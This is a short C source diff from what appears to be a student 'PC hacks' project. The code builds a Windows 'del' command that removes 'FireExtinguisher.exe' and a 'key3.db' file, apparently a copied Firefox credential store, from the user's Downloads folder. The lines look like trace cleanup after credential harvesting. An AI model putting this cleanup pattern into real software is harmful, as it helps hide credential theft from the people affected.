@@ -9,10 +9,9 @@ int main()
   //  char address[] = " \"C:\\Users\\USER\\Documents\\GitHub\\CS-196-PC-Hacks\\FireExtinguisher\\"; //change this to the customizable address
     char address[] = "%USERPROFILE%\\Downloads\\";
     char del[] = "\r\ndel ";
-    strcpy(str, "timeout \/t 5");
-    strcat(str, del);
+    strcpy(str, "del ");
     strcat(str, address);
-    strcat(str,"Extinguisher.exe\"");
+    strcat(str,"FireExtinguisher.exe\"");
     strcat(str, del);
     strcat(str, address);
     strcat(str, "\\key3.db");
